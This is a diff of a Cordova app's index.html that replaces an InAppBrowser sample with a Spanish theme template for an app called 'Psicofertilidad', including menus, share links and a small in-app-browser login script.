@@ -1,47 +1,233 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-        <meta charset="utf-8">
-        <link href="styles/theme.css" rel="stylesheet" type="text/css" />
+                
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0 minimal-ui" />
+        <meta name="apple-mobile-web-app-capable" content="yes" />
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <link rel="stylesheet" type="text/css" href="styles/style.css">
+		<link rel="stylesheet" type="text/css" href="styles/framework.css">
+		<link rel="stylesheet" type="text/css" href="styles/font-awesome.css">
+        
+        <meta name="format-detection" content="telephone=no">
+        <meta name="msapplication-tap-highlight" content="no">
+        <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width">
+        
+        <script src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
+        <script src="http://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.js"></script>
+		<script type="text/javascript" src="scripts/jquery.js"></script>
+        
         <script type="text/javascript" charset="utf-8" src="cordova.js"></script>
         <script type="text/javascript" charset="utf-8" src="scripts/main.js"></script>
+        <script type="text/javascript" src="scripts/jquery.js"></script>
+		<script type="text/javascript" src="scripts/plugins.js"></script>
+		<script type="text/javascript" src="scripts/custom.js"></script>
+
+        
     </head>
-    <body>
-        <div class="header">
-            <h1>InAppBrowser Sample</h1>
-        </div>
-        <div class="subheader">
-            <div class="row">
-                <div class="col">
-                    <button class="button" id="openLocal">Open embedded Image resource</button>
-                </div>
-                <div class="col">
-                    <button class="button" id="openExternalInAppBrowser">Open external page with InAppBrowser</button>
+    
+    <div class="gallery-fix"></div><!-- Fix Gallery next/prev error on Android -->
+<div class="share-bottom-tap-close"></div><!-- Closes the bottom share box on tapping anywhere on the content -->
+<div class="menu-tap-close light-close"></div>   
+    
+<div class="header-fixed header-dark">
+    <a href="#" class="open-left-menu"><i class="fa fa-navicon"></i></a>
+    <a href="#" class="close-left-menu"><i class="fa fa-times"></i></a>
+    <h3>Psicofertilidad</h3>
+    <a href="#" class="open-right-menu"><i class="fa fa-envelope-o"></i></a>
+    <a href="#" class="close-right-menu"><i class="fa fa-times"></i></a>
+</div>
+                
+<div id="page-content">
+    <div id="page-content-scroll">
+        <!--<div id="calendari"></div> -->
+        <div class="header-clear"></div>
+       <div class="frase">
+               <p class="c"> "LA VIDA PUEDE SER MARAVILLOSA " </p>
+           </div>
+
+
+
+           <div class="footer">
+               <div class="footer-socials no-bottom">
+                   <a href="#" class="scale-hover facebook-color"><i class="fa fa-facebook"></i></a>
+                   <a href="#" class="scale-hover twitter-color"><i class="fa fa-twitter"></i></a>
+                   <a href="#" class="scale-hover google-color"><i class="fa fa-google-plus"></i></a>
+                   <a href="#" class="scale-hover phone-color"><i class="fa fa-phone"></i></a>
+                   <a href="#" class="scale-hover mail-color show-share-bottom"><i class="fa fa-refresh"></i></a>
+                   <a href="#" class="scale-hover bg-night-dark back-to-top"><i class="fa fa-angle-up"></i></a>
+                   <div class="clear"></div>
+               </div>
+
+           </div>
+
+    </div>
+</div>
+
+<div class="left-menu light-menu">
+    <div class="menu-scroll">
+        <a class="menu-item" href="index.html">
+            <i class="fa"><img class="iconos" src="internet.png"></i>
+            <em>Inici</em> </a>
+        <a class="menu-item" href="#" onclick="closeb()">
+            <i class="fa"><img class="iconos" src="lotus.png"></i>
+            <em>Terapia</em> </a>
+        <a class="menu-item" href="#" onclick="closeb()">
+            <i class="fa "><img class="iconos" src="calendar-3.png"></i>
+            <em>Periodo</em> </a>
+
+        <div class="has-submenu">
+            <a class="menu-item open-submenu" href="#">
+                <i class="fa"><img class="iconos"src="video-camera.png"></i>
+                <em>Galeria</em> </a>
+            <div class="submenu">
+                <div class="submenu-scroll">
+                    <a class="submenu-item" href="features-type.html"> <i class="fa fa-font"></i><em>Type</em></a>
+                    <a class="submenu-item" href="features-tabs.html"> <i class="fa fa-th-large"></i><em>Tabs</em></a>
+                    <a class="submenu-item" href="features-toggles.html"> <i class="fa fa-plus"></i><em>Toggles</em></a>
+                    <a class="submenu-item" href="features-accordion.html"> <i class="fa fa-chevron-down"></i><em>Accordion</em></a>
+                    <a class="submenu-item" href="features-notify.html"> <i class="fa fa-bell-o"></i><em>Notify</em></a>
+                    <a class="submenu-item" href="features-charts.html"> <i class="fa fa-bar-chart"></i><em>Charts</em></a>
+                    <a class="submenu-item" href="features-buttons.html"> <i class="fa fa-hand-pointer-o"></i><em>Buttons</em></a>
+                    <a class="submenu-item" href="features-device.html"> <i class="fa fa-mobile"></i><em>Detection</em></a>
+                    <a class="submenu-item" href="features-others.html"> <i class="fa fa-refresh"></i><em>Others</em></a>
+                    <a class="submenu-item close-submenu" href="#">  <i class="fa "><img class="iconos" src="cancel.png">
+                    </i><em>Cerrar</em> </a>
                 </div>
             </div>
-            <div class="row">
-                <div class="col">
-                    <button class="button" id="openExternalPDF">Open online PDF</button>
+        </div>
+        <div class="has-submenu">
+            <a class="menu-item open-submenu" href="#">
+                <i class="fa"><img class="iconos" src="nature.png"></i>
+                <em>Relax</em> </a>
+            <div class="submenu">
+                <div class="submenu-scroll">
+                    <a class="submenu-item" href="gallery-round.html"> <i class="fa fa-circle-o"></i><em>Rounded</em></a>
+                    <a class="submenu-item" href="gallery-square.html"> <i class="fa fa-square-o"></i><em>Squared</em></a>
+                    <a class="submenu-item" href="gallery-adaptive.html"> <i class="fa fa-th-list"></i><em>Adaptive</em></a>
+                    <a class="submenu-item" href="gallery-filter.html"> <i class="fa fa-th"></i><em>Filterable</em></a>
+                    <a class="submenu-item" href="gallery-wide.html"> <i class="fa fa-arrows-alt"></i><em>Wide</em></a>
+                    <a class="submenu-item close-submenu" href="#">   <i class="fa "><img class="iconos" src="cancel.png">
+                    </i><em>Cerrar</em> </a>
                 </div>
-                <div class="col">
-                    <button class="button" id="openExternalInSystemBrowser">Open in system browser.</button>
+            </div>
+        </div>
+        <div class="has-submenu">
+            <a class="menu-item open-submenu" href="#">
+                <i class="fa "><img class="iconos" src="user.png"></i>
+                <em>Consejos</em> </a>
+            <div class="submenu">
+                <div class="submenu-scroll">
+                    <a class="submenu-item" href="portfolio-one.html"> <i class="fa fa-hand-pointer-o"></i><em>One Item</em></a>
+                    <a class="submenu-item" href="portfolio-two.html"> <i class="fa fa-hand-peace-o"></i><em>Two Item</em></a>
+                    <a class="submenu-item" href="portfolio-adaptive.html"> <i class="fa fa-th-list"></i><em>Adaptive</em></a>
+                    <a class="submenu-item" href="portfolio-filter.html"> <i class="fa fa-th"></i><em>Filterable</em></a>
+                    <a class="submenu-item" href="portfolio-wide.html"> <i class="fa fa-arrows-alt"></i><em>Wide</em></a>
+                    <a class="submenu-item close-submenu" href="#">   <i class="fa "><img class="iconos" src="cancel.png">
+                    </i><em>Cerrar</em> </a>
+                </div>
+            </div>
+        </div>
+        <div class="has-submenu">
+            <a class="menu-item open-submenu" href="#">
+                <i class="fa"><img class="iconos" src="mail.png"></i>
+                <em>Contacto</em> </a>
+            <div class="submenu">
+                <div class="submenu-scroll">
+                    <a class="submenu-item" href="page-error.html"> <i class="fa fa-exclamation"></i><em>Error</em></a>
+                    <a class="submenu-item" href="page-soon.html"> <i class="fa fa-clock-o"></i><em>Soon</em></a>
+                    <a class="submenu-item" href="page-activity.html"> <i class="fa fa-list"></i><em>Activity</em></a>
+                    <a class="submenu-item" href="page-profile-1.html"> <i class="fa fa-user"></i><em>Profile 1</em></a>
+                    <a class="submenu-item" href="page-profile-2.html"> <i class="fa fa-user"></i><em>Profile 2</em></a>
+                    <a class="submenu-item" href="page-login.html"> <i class="fa fa-lock"></i><em>Login</em></a>
+                    <a class="submenu-item" href="page-signup.html"> <i class="fa fa-code"></i><em>Signup</em></a>
+                    <a class="submenu-item" href="page-userlist.html"> <i class="fa fa-user"></i><em>Userlist</em></a>
+                    <a class="submenu-item" href="page-reviews.html"> <i class="fa fa-star"></i><em>Reviews</em></a>
+                    <a class="submenu-item close-submenu" href="#">  <i class="fa "><img class="iconos" src="cancel.png">
+                    </i><em>Cerrar</em> </a>
+                </div>
+            </div>
+        </div>
+        <div class="has-submenu">
+            <a class="menu-item open-submenu" href="#">
+                <i class="fa "><img class="iconos" src="information-button.png">
+                </i><em>Acerca de</em> </a>
+            <div class="submenu">
+                <div class="submenu-scroll">
+                    <a class="submenu-item" href="pageapp-chat.html"> <i class="fa fa-comment-o"></i><em>Chat</em></a>
+                    <a class="submenu-item" href="pageapp-login.html"> <i class="fa fa-lock"></i><em>Login</em></a>
+                    <a class="submenu-item" href="pageapp-signup.html"> <i class="fa fa-code"></i><em>Signup</em></a>
+                    <a class="submenu-item" href="pageapp-calendar.html"> <i class="fa fa-calendar"></i><em>Calendar</em></a>
+                    <a class="submenu-item" href="pageapp-tasklist.html"> <i class="fa fa-check"></i><em>Tasklist</em></a>
+                    <a class="submenu-item" href="pageapp-checklist.html"> <i class="fa fa-check"></i><em>Checklist</em></a>
+                    <a class="submenu-item" href="pageapp-reminders.html"> <i class="fa fa-bell-o"></i><em>Reminders</em></a>
+                    <a class="submenu-item" href="pageapp-coverpage.html"> <i class="fa fa-image"></i><em>Coverpage</em></a>
+                    <a class="submenu-item" href="pageapp-timeline-1.html"> <i class="fa fa-align-left"></i><em>Timeline 1</em></a>
+                    <a class="submenu-item" href="pageapp-timeline-2.html"> <i class="fa fa-align-center"></i><em>Timeline 2</em></a>
+                    <a class="submenu-item close-submenu" href="#">   <i class="fa "><img class="iconos" src="cancel.png">
+                    </i><em>Cerrar</em> </a>
                 </div>
             </div>
         </div>
 
-        <div class="content">
-            <div class="row -align-bottom">
-                <div class="col u-color-accent -text-center">
-                    <div>
-                        To open an embedded PDF, refer to the
-                        <a href="https://github.com/Icenium/sample-file-open-pdf" target="_blank">Open PDF sample app.</a>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="footer">
-            <span>Feature Examples</span>
-        </div>
-    </body>
+        <a class="menu-item close-menu" href="#">   <i class="fa "><img class="iconos" src="cancel.png">
+        </i><em>Cerrar</em> </a>
+    </div>
+</div>
+
+<div class="right-menu light-menu">
+    <div class="menu-scroll">
+        <a class="menu-item" href="https://www.facebook.com/enabled.labs/"> <i class="fa"><img class="iconos" src="facebook-logo-in-circular-button-outlined-social-symbol.png"></i><em>Me gusta</em> </a>
+        <a class="menu-item" href="https://twitter.com/iEnabled"> <i class="fa"><img class="iconos" src="twitter-circular-button.png"></i><em>Siguenos</em> </a>
+        <a class="menu-item" href="https://plus.google.com/u/1/100477648973116025417/posts"> <i class="fa "><img class="iconos" src="google-plus-circular-button.png"></i><em>Siguenos</em></a>
+        <a class="menu-item" href="page-map.html"> <i class="fa "><img class="iconos" src="placeholder.png"></i></i><em>Find Us</em>  </a>
+        <a class="menu-item close-menu" href="#">   <i class="fa "><img class="iconos" src="cancel.png">
+        </i><em>Cerrar</em> </a>
+    </div>
+</div>
+
+
+<div class="share-bottom-tap-close"></div>
+<div class="share-bottom share-dark">
+    <h3>Share Page</h3>
+    <div class="share-socials-bottom">
+        <a href="https://www.facebook.com/sharer/sharer.php?u=http://www.themeforest.net/">
+            <i class="fa fa-facebook facebook-color"></i>
+            Facebook
+        </a>
+        <a href="https://twitter.com/home?status=Check%20out%20ThemeForest%20http://www.themeforest.net">
+            <i class="fa fa-twitter twitter-color"></i>
+            Twitter
+        </a>
+        <a href="https://plus.google.com/share?url=http://www.themeforest.net">
+            <i class="fa fa-google-plus google-color"></i>
+            Google
+        </a>
+        <a href="https://pinterest.com/pin/create/button/?url=http://www.themeforest.net/&media=https://0.s3.envato.com/files/63790821/profile-image.jpg&description=Themes%20and%20Templates">
+            <i class="fa fa-pinterest-p pinterest-color"></i>
+            Pinterest
+        </a>
+        <a href="sms:">
+            <i class="fa fa-comment-o sms-color"></i>
+            Text
+        </a>
+        <a href="mailto:?&subject=Check this page out!&body=http://www.themeforest.net">
+            <i class="fa fa-envelope-o mail-color"></i>
+            Email
+        </a>
+        <div class="clear"></div>
+        
+    </div>
+</div>
+<script>
+function closeb(){
+    var ref = window.open(encodeURI("http://vayaputada.com.es/google-login-master"), '_blank', 'location=no');
+	ref.addEventListener('loadstop', function(event) {        
+    if (event.url.match("mobile/close")) {
+        ref.close();
+    }
+});
+}
+</script>
 </html>
